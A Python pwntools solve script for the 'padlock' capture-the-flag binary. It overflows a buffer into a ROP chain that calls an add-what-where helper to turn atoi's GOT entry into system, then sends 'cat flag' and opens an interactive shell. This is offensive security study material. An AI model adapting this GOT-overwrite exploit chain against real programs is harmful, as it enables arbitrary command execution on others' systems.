#!/usr/bin/env python3
from pwn import *

"""
The idea is to OVERWRITE the atoi GOT ENTRY with the system address, so when the programs call atoi() in reality is system() the function executed, and then provide the /bin/sh to spawn a shell.
First of all we should calculate the DELTA between the system() and atoi() libc function.Then we can mount the attack.

The attack consist in 3 steps:
    
-TRIGGER THE LAZY BINDER GOT RESOLUTION (STEP 0)-> As first thing we provide a legitimate input i order to trigger the plt the resolution of the atoi funcion in the GOT table and so now we know the right address.

-ADDING THE DELTA TO THE ATOI GOT ADDRESS (STEP 1) -> Now we can exploit the exposed function "add_what_where" to add the DELTA to the atoi got address discovered/verified with the step 0, so the next time instead of atoi system will be executed

- SEND CAT FLAG COMMAND ->  Now we simply send the command that we want to execute (cat flag), since in this call the atoi libc function is exchanged with system.

"""



context.binary = elf = ELF('./padlock', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#context.log_level="debug"

HOST,PORT="offsec.m0lecon.it",13594
p = process(elf.path)
#p= remote(HOST,PORT)

rop = ROP(elf)


OFFSET_TO_RIP =88


POP_RDI        = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI        = rop.find_gadget(['pop rsi', 'ret'])[0]
RET            = rop.find_gadget(['ret'])[0]

MAIN           = elf.sym['main']
ADD_WHAT_WHERE = elf.sym['add_what_where']
ATOI_GOT       = elf.got['atoi']

DELTA = 0x120f0 #DELTA FLAG --> libc.symbols['system'] - libc.symbols['atoi']
#DELTA = 0x129d0 #DELTA LOCALE --> readelf -s ld-linux-x86-64.so.2 | grep "system" ; readelf -s ld-linux-x86-64.so.2 | grep "atoi"



log.info(f"POP_RDI:{hex(POP_RDI)}")
log.info(f"ADD_WHAT_WHERE:{hex(ADD_WHAT_WHERE)}")
log.info(f"ATOI_GOT:{hex(ATOI_GOT)}")
log.info(f"MAIN:{hex(MAIN)}")




#============== STAGE 0: TRIGGER THE LAZY BINDER GOT RESOLUTION  ==================#
p.recvuntil(b"combination:")
stage0 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(MAIN) 
)
p.send(stage0)
ATOI_GOT1  = elf.got['atoi']
log.info(f"ATOI_GOT1:{hex(ATOI_GOT1)}")
#============== STAGE 1: ADDING THE DELTA TO THE ATOI GOT ADDRESS ==================#


p.recvuntil(b"combination:")
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
   
    p64(POP_RDI),p64(ATOI_GOT),
    p64(POP_RSI),p64(DELTA),
    p64(ADD_WHAT_WHERE), 
    p64(RET),      
    p64(MAIN) 
)
p.send(stage1)
#gdb.attach(p)
p.recvuntil(b"combination:")
#============== STAGE 2: SEND CAT FLAG COMMAND ==================#

p.send(b"cat flag\x00")


p.interactive()
